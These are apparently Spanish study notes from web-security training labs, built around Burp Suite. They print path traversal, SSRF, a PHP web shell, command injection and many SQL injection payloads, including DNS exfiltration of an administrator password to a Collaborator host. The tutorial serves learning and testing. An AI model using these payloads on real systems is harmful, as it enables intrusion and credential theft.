# Seguridad Informática
- [Burp Suite](#burp-suite)
- [John the Ripper](#john-the-ripper)
- [Metasploit](#metasploit)
- [Nmap](#nmap)
- [Wireshark](#wireshark)
- [Sqlmap](#sqlmap)

Este documento recopila información y notas personales sobre diversas herramientas y técnicas en el campo de la seguridad informática.

## Burp Suite

Burp Suite es una herramienta esencial para el análisis de seguridad de aplicaciones web. Permite realizar pruebas manuales y automatizadas para identificar vulnerabilidades de seguridad.

### Path Traversal
Permite al atacante aceder a archivos que no deberia. Por ejemplo `https://insecure-website.com/loadImage?filename=../../../etc/passwd` permitiria acceder a `/var/www/images/../../../etc/passwd` que daria lugar a que se accediese en realidad a `/etc/passwd`.

### Autenticacions y autorizacion
- Autenticacion es que sea quien dice ser, autorizacion que tenga permisos de hacer algo.

### Trucos
- Es posible eludir el 2FA cuando la verificación se realiza en una página distinta.
- En robots txt se puede encontrar informacion sobre partes prohibidas.
- Se pueden modificar las cookies en los responses request, o en el inspector->aplications.
- AL intentar adivinar usuario, si acertamos: el mensaje de error o codigo puede ser distinto. si la contrasenia es mas larga puede demorar mas en caso de que el usuario exista.

### SSRF
- La falsificación de solicitud del lado del servidor (Server-side request forgery o SSRF) es una vulnerabilidad de seguridad web que permite a un atacante hacer que una aplicación del lado del servidor realice solicitudes a una ubicación no deseada, pudiendo conectar con servicios internos o externos y filtrar datos sensibles, como credenciales de autorización.
- Ejemplo: `POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1`
Cambiamos la ultima linea por `stockApi=http://localhost/admin`
Tambien pueden ser de la forma `stockApi=http://192.168.0.X/admin` en cuyo caso hay que explorar en X. El 0 puede ser 1.

### File vulnerabilities
- Se puede subir archivo php: `<?php echo file_get_contents('/path/to/target/file'); ?>` o `<?php echo system($_GET['command']); ?>` que luego puede ser `GET /example/exploit.php?command=id HTTP/1.1`
- Se puedden subir cambiando el content type en el request por `image/jpeg` o `image/png` (mandandolo a repetidor)

### OS commandd injection
#### Comandos utiles
| Propósito del comando        | Linux    | Windows         |
|------------------------------|----------|-----------------|
| Nombre del usuario actual    | `whoami` | `whoami`        |
| Sistema operativo            | `uname -a` | `ver`          |
| Configuración de red         | `ifconfig` | `ipconfig /all` |
| Conexiones de red            | `netstat -an` | `netstat -an` |
| Procesos en ejecución        | `ps -ef` | `tasklist`      |

##### Uso de la línea de comandos para testing
- Ejemplo de comando: `stockreport.pl 381 29` en línea de comandos para acceder al stock.
  - Payload de ejemplo: `productId=1&storeId=1; whoami`. Si se ejecuta desde terminal, este payload puede ser procesado sin mayores restricciones. ; o & o &&

### Detección de vulnerabilidades de inyección SQL

- Para detectar vulnerabilidades de inyección SQL manualmente, realiza un conjunto sistemático de pruebas contra cada punto de entrada en la aplicación.
- El caracter ' y buscar errores o anomalías.
- Sintaxis específica de SQL que evalúa al valor base (original) del punto de entrada, y a un valor diferente, y busca diferencias sistemáticas en las respuestas de la aplicación.
- Condiciones booleanas tales como OR 1=1 y OR 1=2, y busca diferencias en las respuestas de la aplicación.
- Cargas útiles diseñadas para provocar retrasos de tiempo cuando se ejecutan dentro de una consulta SQL, y busca diferencias en el tiempo que tarda en responder.
 - Cargas útiles OAST diseñadas para desencadenar una interacción de red fuera de banda cuando se ejecutan dentro de una consulta SQL, y monitorea cualquier interacción resultante. Útiles para identificar vulnerabilidades que implican la ejecución de código o la exposición de datos sensibles a través de canales secundarios, como DNS, correos electrónicos, o sistemas de mensajes.

El Burp Scanner debería ser capaz de encontrar las inyecciones SQLs obvias.
La mayoría de vulnerabilidades ocurren en la clausula WHERE del SELECT.
Sin embargo, también es común encontrarlos en el WHERE del UPDATE, en los valores del INSERT, en la tabla o nombre de columna del SELECT, o en los ORDER BY.

#### Ejemplo 1
`https://insecure-website.com/products?category=Gifts`

podría hacer que la aplicación ejecute este código:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Podríamos agregar dos líneas para que el resto se comentase, logrando que se evitase el release=1:

`https://insecure-website.com/products?category=Gifts'--`

También agregar lo siguiente para que muestre todo, no solo de la categoría Gifts:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

#### Ejemplo 2
Al poner usuario y contraseña, el servidor ejecuta:

`SELECT * FROM users WHERE username = 'usr' AND password = 'pass'`

Y si la query devuelve los datos, entonces se hace el login, de lo contrario es rechazado. Usando `--` un usuario podria evitar la parte del `AND password = 'pass'`, logrando ser capaz de logearse como cualquier usuario

### Inyecciones SQL de ataque UNION
Union permite agregar otro SELECT luego del SELECT inicial:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

Para que funcione se deben cumplir dos condiciones:
- Cada query debe devolver la misma cantidad de columnas.
- Los tipos de cada columna deben ser compatibles entre los distintoss querys, en este ejemplo a con c y b con d.
Al intentar hacer un ataque UNION, hay dos metodos efectivos para determinar cuantas columnas devuelve la query original.
#### Método 1
Inyectar series de ORDER BY e incrementar el indice de columna hasta que ocurra un error. Por ejemplo, si el punto de inyección es un string dentro de un WHERE, podría intentarse esto:

`' ORDER BY 1--`  
`' ORDER BY 2--`  
`' ORDER BY 3--`  
`etc.`

Cuando se exceda el numero de columna, la base dara un error del estilo  
`The ORDER BY position number 3 is out of range of the number of items in the select list.`  
Sin embargo este error podría o no devolverse en la respuesta HTTP. Tambien podría devolver un error genérico o no devolver nada. Sin embargo si se puede detectar alguna diferencia en la respuesta, se puede inferir cuántas columnas están siendo devueltas.  
Sirve mirar en que orden se ordenan los componentes http para ver cual columna es cual. Puede dar pistas.
#### Método 2
La otra opción es subir una serie de payloads UNION SELECT especificando distintos valores NULL:

`' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.`

que devolverá un error si no macchea con la cantidad de columnas de la base de datos.
Usamos NULL ya que no sabemos que tipo de datos tiene cada columna, y NULL es convertible a todos los tipos de datos asi que maximiza la chance de que el payload tenga exito cuando la cantidad de atributos corresponda con la columna. Sin embargo, tener en cuenta que pueden haber columnas que no pueden contener valor NULL.
Si la consulta tiene exito y es devuelta por el HTTP, devolvera una fila extra con valores NULL en cada columna. Tambien podrian generar un NullPointerException. En el peor de los casos la respuesta se verá igual acertando o errando la cantidad, en cuyo caso este metodo no es efectivo.

#### Sintaxis especifico de database
- En Oracle se usa FROM DUAL para obtener info random por ejemplo del sistema. Se pueden hacer varias cosas interesantes con lo de DUAL, como consultar el usuario de la bd, llamar a funciones, entre otras cosas random.
- En  MySQL el -- tiene que ir seguido de un espacio, o se puede usar un # para marcar un comentario. **A veces el -- no sirve y hay que usar #**

[SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) de las diversas particularidades de cada DB.

#### Obtener columnas que devuelvan string
La informacion interesante usualmente esta en forma de string. Esto significa que queremos encontrar las columnas cuyo tipo de datos sea string o compatible con string. Por ejemplo asi:

`' UNION SELECT 'a',NULL,NULL,NULL--`  
`' UNION SELECT NULL,'a',NULL,NULL--`  
`' UNION SELECT NULL,NULL,'a',NULL--`  
`' UNION SELECT NULL,NULL,NULL,'a'--`

Si el tipo de dato de la columna no es compatible con string, el query causara un error en la base de datos, que una vez mas podra ser o no visible en la respuesta http. Esto sirve como para explorar la BD.

#Punto de inyeccion: el punto en la consulta sql al que podemos inyectarle mierda  
Se puede hacer `' UNION SELECT username, pass FROM users--` por ejemplo

#### Concatenar varias columnas en una sola
A veces la consulta SQL del servidor devuelve una cantidad menor de columnas de las que queremos extraer. Para esto, podemos concatenar varios valores de columnas en una sola.  
Por ejemplo, en Oracle se hace asi:  
`' UNION SELECT username || '~' || password FROM users--`  
El || concatena y el ~ en este caso simplemente separa, pero podria ser cualquier otro simbolo.  
Una vez más, en el [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) se puede encontrar la sintaxis de cada DB.

##### Ejemplo
Hay una consulta que da dos campos, un codigo int y un string. Para obtener los resultados puedo usar  
`' UNION SELECT 1,username || '~' || password FROM users--`  
El 1 es para que quede ese valor en la primera columna, ya que el esquema del union select tiene que ser compatible con el select original. Los espacios en realidad serían +, en todas las inyecciones (`'+UNION+SELECT+1,username+...`)

#### Examinando la base de datos
Para explotar vulnerabilidades SQL se necesita conocer el tipo y version de la base asi como las tablas y columnas que contiene esta base.

| Tipo de base     | Consulta                 |
|------------------|--------------------------|
| Microsoft, MySQL | `SELECT @@version`       |
| Oracle           | `SELECT * FROM v$version`|
| PostgreSQL       | `SELECT version()`       |  

Podria usarse por ejemplo con un UNION. El @@version aparentemente muestra version del so?  
La mayoria de bases de datos (excepto Oracle) tiene un conjunto de vistas llamado esquema de informacion, que provee informacion de la base de datos, por ejemplo, podria usarse la consulta `SELECT TABLE_NAME,NULL,... FROM information_schema.tables` para obtener las tablas de la base.  
Luego, usando `SELECT COLUMN_NAME,DATA_TYPE,NULL,... FROM information_schema.columns WHERE table_name = 'Users'` podriamos obtener el esquema de la tabla Users.
Luego ya teniendo las columnas de users podriamos hacer `SELECT username, pass,NULL,... FROM Users`
information_schema.tables: TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
information_schema.columns: TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE

### Inyección SQL ciega (blind)
Ocurre cuando una aplicacion es vulnerable a una inyeccion SQL pero sus respuestas HTTP no contienen el resultado de la consulta SQL relevante o detalles sobre un error en la base de datos.  
Muchas tecnicas, como la de `UNION` no son efectivos con inyecciones SQL ciegas, ya que su éxito depende completamente de poder ver los resultados de la consulta inyectada en las respuestas de la aplicacion. Sin embargo aún es posible explotar las inyecciones ciegas para obtener acceso no autorizado, pero debemos usar técnicas distintas.

#### Ejemplo de inyección SQL ciega con cookies
Una pagina tiene una cookie de tracking: `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4` para la cual la aplicación usa una consulta SQL para determinar si es un usuario conocido:  
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`  
Esta consulta es vulnerable a una inyección SQL pero los resultados no son devueltos al usuario. Sin embargo la aplicación se comporta distinto dependiendo en si la consulta devuelve algún dato o no; si se sube un id reconocido, el query devuelve datos y se recibe el mensaje "Welcome back" en la respuesta.  
Este comportamiento es suficiente para explotar la vulnerabilidad, ya que podemos obtener informacion al desencadenar diferentes respuestas condicionalmente, dependiendo de  una condicion inyectada.
Le agregamos a la cookie `' AND '1'='1` o `' AND '1'='2` y en el primer caso da true y en el segundo caso no. Entonces podemos jugar con eso por ejemplo para intentar adivinar la contraseña del Administrador:  
`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
En caso de que no aparezca el mensaje "Welcome back", se estaría indicando que la condicion es falsa, osea que el primer caracter de la contraseña es menor a t.  
`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`  
En caso de que esta última consulta diera true, podriamos estar seguros de que la primer letra de la contraseña del administrador es s. Podriamos seguir este proceso hasta obtener la contraseña del administrador.
#SUUBSTRING a veces se llama SUBSTR dependiendo de la base de datos. El primer 1 es la posicion el segundo el largo del substring.
Ejemplo: `Cookie: TrackingId=xK4RIo0XAv9wnTGy' AND SUBSTRING((SELECT password FROM users WHERE Username = 'administrator'), 1, 4) > 'b73a;`  
En este caso los dos primeros caracteres son b8, con lo cual b7 dara true, b8 dara false. Se va fijando para cada caracter como si fueran numeros. Ademas, tener en cuenta que ''a'>'0'  
Si ponemos largo 26 pero el campo tiene 15 caracteres, solo tomara los 15 caracteres.

### Inyección SQL basada en error
Se refiere a los casos cuando puede usarse un mensaje de error para obtener o inferir información sensible de la base de datos, incluso en contextos ciegoss. La viabilidad de este método depende de la configuración de la base de datos y de los errores que podamos desencadenar.  
- Podríamos ser capaces de inducir a la aplicación a devolver una respuesta de error específica basada en el resultado de una expresión booleana. Podemos explotar esto de la misma forma que en las respuestas condicionales del ejemplo anterior.
- Podríamos ser capaces de desencedenar mensajes de error que outputeen la información devuelta por el query. Esto efectivamente convierte las vulnerabilidades SQL ciegas en visibles.

#### Explotando inyección SQL ciega desencadenando errores condicionales
Algunas aplicaciones ejecutan queries SQL pero su comportamiento no cambia independientemente de si la query devuelve o no información. En este caso la técnica no funcionará porque inyectar condiciones booleanas no le hace diferencia a la aplicación.  
Sin embargo a veces es posible inducirla a devolver respuestas diferentes dependiendo de si ocurre un error. La query puede modificarse para que cause un error en la BD si y sólo si la condición es true. Usualmente un error no manejado lanzado por la base causa alguna diferencia en la respuesta de la aplicación, como un mensaje de error. Esto nos permite inferir si la condición inyectada era cierta o no.  
Para ver cómo funciona eto, supongamos que se envian dos request en el cookie:  
`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`  
`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`  
Esto usa `CASE` para testear una condición y devuelve una expresión diferente dependiendo de si la expresión es true:
- En el primer caso, devuelve 'a' lo que no causa ningun error.
- En el segundo caso evalua 1/0, lo que causa un error al dividir por 0.
Si el error causa una diferencia en la respuesta HTTP podemos usar esto para determinar si la condición inyectada es verdadera. Haciendo esto podemos obtener la información como en el caso anterior, un caracter por vez:
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
#Hay formas diferentes de desencadenar errores condicionales y cada técnica funciona mejor o peor dependiendo del tipo de base de datos. Para más detalles, revisar la [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
Podemos en el TrackingId primero agregar un ' para ver si devuelve error de sintaxis. El error deberia desaparecer si ponemos '' (`TrackingId=WbS9PRMYS9vtBMXH''`). Esto sugiere que un error de sintaxis es detectable.  
Luego para confirmar que el servidor esta interpretando la inyeccion como una query SQL podemos usar un subquery usando sintaxis SQL valida como puede ser `TrackingId=xyz'||(SELECT '')||'`. Sin embargo esto podria dar error dependiendo del tipo de base de datos. En el caso de Oracle por ejemplo podemos intentarlo con algo que sabemos que funciona: `TrackingId=xyz'||(SELECT '' FROM dual)||'`. Despues de esto para confirmar que devuelve un error podemos simplemente probar con algo que no funcionara, como usando una tabla que no exista: `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`. Si ahora si se devuelve un error esto sugiere fuertemente que la inyeccion se esta procesando como una query SQL en el back-end.
Por ejemplo, para verificar que la tabla `users` exista, podemos usar el siguiente query:
`TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
Si no devuelve un error podemos asumir que la tabla existe. Notar que `WHERE ROWNUM = 1` es importante para prevenir que el query devuelva mas de una fila, lo que romperia nuestra concatenacion.
Por ejemplo para corroborar que la verificacion de condiciones se muestra, podriamos ingresar esta query:
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`  
Si lo cambiamos a `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` el error deberia desaparecer.
Con esta query podemos determinar el **largo** de la contra del admin:  
`xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
Mientras el largo sea mayor al numero, dara true, en cuyo caso hara el 1/0 y por ende devolvera error.

Aunque puede hacerse manualmente, a veces son campos muy largos, con lo cual en lugar del Burp Repeater es mejor usar el Burp Intruder.  
`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
Para poner un payload en el caracter `a` lo seleccionamos y clickeamos en Add §. Para probar un caracter en cada posicion, necesitamos tener payloads adecuados en la posicion. Vamos a la pestaña Payloads y chequeamos "Simple list", y en Payload settings agregamos los del rango `a-z` y `0-9`  
Simplemente vamos ejecutando el ataque en paralelo cada uno cambiando el numero en el SUBSTR y obtenemos los que dan codigo 500.  

#### Extrayendo información sensible mediante mensajes de error SQL verbosos
Una configuración precaria de la base de datos a veces lleva a mensajes de error verbosos, los cuales pueden proveer información útil a un atacante. Por ejemplo, consideremos el siguiente mensaje de error que ocurre al inyectar un ' en el parametro de `id`:  
`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`  
Esto muestra el query completo de la aplicacion construido usando nuestro input. Podemos ver que en este caso estamos inyectando dentro de un string con '' en un bloque `WHERE`. Esto facilita construir un query valido con un payload malicioso.  En este caso en particular, un -- al final deberia evitar el mensaje de error; esto para chequear que funciona como (no) deberia.
A veces podemos inducir a la aplicacion a generar un mensaje de error que contenga datos que son devueltos por el query. Esto convierte una inyeccion SQL ciega en una completamente visible.  
Podemos usar la funcion `CAST()` para lograr esto, lo que nos permite convertir un tipo de datos a otro. Por ejemplo, imaginemos que tenemos una query con lo siguiente:  
`CAST((SELECT example_column FROM example_table) AS int)`  
Usualmente la informacion que intentamos leer es un string. Intentar convertirlo en un tipo de datos incompatible como puede ser `Int` podria provocar un error como el siguiente:  
`ERROR: invalid input syntax for type integer: "Example data"`  
Este tipo de query puede ser util si un limite de caracteres nos impide desencadenar respuestas condicionales.  
Ejemplo particular: `xyz' AND CAST((SELECT 1) AS int)--` o `' AND 1=CAST((SELECT username FROM users) AS int)--`  
A veces se dan errores por superara el limite de caracteres de la consulta. En esos casos debemos intentar achicarla. En ese caso podemos achicar incluso más la consulta, por ejemplo:  
`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`  
Esto podria dejarnos este mensaje de error: `ERROR: invalid input syntax for type integer: "peter"`. Luego restaria hacer lo mismo con la pass y gg.

### Explotar inyecciones SQL ciegas triggering time delays
Si la aplicacion agarra los errores de la base de daos cuando la query SQL es ejecutada y lo maneja de forma adecuada, no habrá ninguna diferencia en la respuesta de la aplicación. Esto significa que la técnica vista previamente para inducir errores condicionales no funcionará.  
En esta situación usualmente es posible explotar la vulnerabilidad de inyección SQL ciega desencadenando `time delays` dependiendo de la condicion de la query ingresada es verdadera o falsa. Dado que las querys SQL normalmente son procesadas sincronicamente por la aplicacion, demorar la ejecucion de un query SQL tambien demora la respuesta HTTP. Esto puede permitirnos determinar la veracidad de la condicion basandonos en el tiempo que nos lleva recibir la respuesta HTTP.

Las tecnicas para desencadenar un time delay son especificas del tipo de base de datos usado. Por ejemplo, en Microsoft SQL Server, puede usarse el siguiente codigo para testear una condicion y desencadenar un delay dependiendo de si la expresion es verdadera:  
`'; IF (1=2) WAITFOR DELAY '0:0:10'--`  
`'; IF (1=1) WAITFOR DELAY '0:0:10'--`  
El primer input no trigerea un delay porque 1=2 es false, pero el segundo trigerea un delay de 10 segundos porque la condicion 1=1 es verdadera.  
Con esta tecnica podemos obtener datos probando con un caracter por vez:  
`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

#Con esta tecnica tambien podemos dejar un delay de X cantidad de tiempo y basicamente dejar la base de datos inutilizada.  
#Hay varias formas de trigerear delays en las queries SQL, dependiendo del tipo de base de datos. Para mas info ya sabes: [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

En particular en PostGre usaremos esto `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`. El `%3B` es para indicar que se termina la consulta y que comienza otra.

**Importante:** Para esta parte, al usar el intruder en el resoruce pool hay que indicarle que el maxium concurrent requests sea 1, si no los tiempos daran mezclados y necesitamos maxima precision.

### Explotar inyeccion SQL usando tecnicas out-of-band (OAST)
Una aplicacion podria ejecutar el mismo query SQL del ejemplo anterior pero hacer de forma asincrona. La aplicacion continua procesando los requests del usuario en el thread original, y usa otro thread para ejecutar el query SQL usando la tracking cookie. La query aun es vulnerable a una inyeccion SQL, pero ninguna de las tecnicas anteriormente mencionadas funcionaria. La respuesta de la aplicacion no depende de si el query devuelve datos o no, o de si ocurre un error en la base, o del tiempo que lleve ejecutar el query.

En esta situacion, usualmente es posible explotar la vulnerabilidad SQL desencadenando *out-of-band network interactions* al sistema que controlamos. Estas se pueden producir por una condicion inyectada para inferir informacion de una pieza a la vez. Tambien los datos podrian ser exfiltrados directamente en la interaccion de red.

Una variedad de protocolos de red pueden ser usados con este proposito, pero tipicamente el mas efectivo es DNS (*domain name service*). Muchas redes de produccion permiten libremente el egreso de queries DNS, porque son esenciales para el funcionamiento normal de los sistemas en produccion.

La herramienta mas sencilla y confiable para usar tecnicas out-of-band es Burp Collaborator. Es un servidor que provee implementaciones personalizadas de varios servicios de red, inclyendo DNS. Nos permite detectar cuándo ocurren las interacciones de red como resultado de enviar payloads individuales a una aplicacion vulnerable. Burp SUite Professional incluye un cliente integrado que esta configurado para funcionar con Burp Collaborator de entrada.

Las tecnicas para desencadenar una query DNS son especificas al tipo de base de datos usada. Por ejemplo, el siguiente input en Microsoft SQL Server puede usarse para causar un DNS lookup en un dominio específico:  
`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`  
Esto provoca que la basa de datos haga un lookup en el siguiente dominio:  
`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`  
Se puede usar Burp Collaborator para generar un subdominio único y consultar el servidor de Burp Collaborator para confirmar cuando ocurran búsquedas DNS.

Nos podemos fijar los distintos payloads en la cheat sheet. Vamos a Collaborator, damos a capoy y guardamos el link, que sustituiremos donde pone http burp collaborator subdomain (dejar el http://). En este caso usaremos  
`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`  
Pues estamos en Oracle. Esto eso una entidad XML externa que todavia no vimos.  
Tambien hay que seleccionar todo y poner Control+U para encodear la url.  
Luego en Collaborator deberia aparecer A o AAAA, lo que significaria que puede que sea vulnerable... algo asi.

Habiendo confirmado una forma de desencadenar interacciones out-of-band, podemos usar el canal out-of-band para exfiltrar datos de la aplicación vulnerable. Por ejemplo:  
`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`  
Esta input lee la contrasenia del usuario Administrador, anexiona un subdominio Collaborator unico y desencadena un DNS lookup. Este lookup permite ver la contrasenia capturada:  
`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`  
Las tecnicas Out-of-band (OAST (Out of band Application Security Testing)) son una muy poderosa forma de detectar y explotar vulnerabilidades de inyeccion SQL ciega, dada la alta chance de exito y la posibilidad de exfiltrar datos de forma directa mediante el canal out-of-band. Por esta razon, las tecnicas OAST son usualmente preferibles incluso en situaciones en las que otras tecnicas para explotar vulnerabilidades ciegas podrian funcionar.  
#Nota: hay varias formas de provocar una interaccion out-of-band, y tecnicas diferentes aplican en diferentes tipos de bases de datos. Tener en cuenta que depende de cada tipo de base.  
Otro ejemplo: `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`  
CLick derecho y inser collaborator payload en burp collaborator subdomain.

### Inyecciones SQL en contextos variables
Se pueden hacer inyecciones SQL usando cualquier input controlable que sea procesado como un query SQL por la aplicacion, por ejemplo JSON o XML usado en una query de la base. Estos formatos proveen formas diferentes de ofuscar los ataques que serian de otra forma bloqueados por los WAFs y otros mecanismos de defensa.  
Las implementaciones debiles usualmente buscan palabras comunes en inyecciones SQL en el request, asi que podria ser posible bypasear estos filtros encodeando o usando caracteres de escape en las keywords prohibidas. Por ejemplo, la siguiente inyeccion SQL basada en XML usa una secuencia de escape XML para encodear el caracter `S` en `SELECT`:  
`<stockCheck>  
    <productId>123</productId>  
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>  
</stockCheck>`  
Esto sera decodificado en el servidor antes de pasar al interprete SQL.
Extension hackvertor usada para encodear. Selecciono lo que quiero encodear  y le doy click a la forma en que quiero encodearlo, por ejemplo hex_entities... nose.  
Ejemplo:  
`<?xml version="1.0" encoding="UTF-8"?>`  
`  <stockCheck>`  
`    <productId>`  
`      2`  
`    </productId>`  
`    <storeId>`  
`      <@dec_entities>1  UNION SELECT username || '~' || password FROM users<@/dec_entities>`  
`    </storeId>`  
`  </stockCheck>`  


## John the Ripper

(TBD - Información por agregar)

## Metasploit

(TBD - Información por agregar)

## Nmap

(TBD - Información por agregar)

## Wireshark

(TBD - Información por agregar)

## Sqlmap

(TBD - Información por agregar)

## Nikto

(TBD - Información por agregar)

## Hydra

(TBD - Información por agregar)

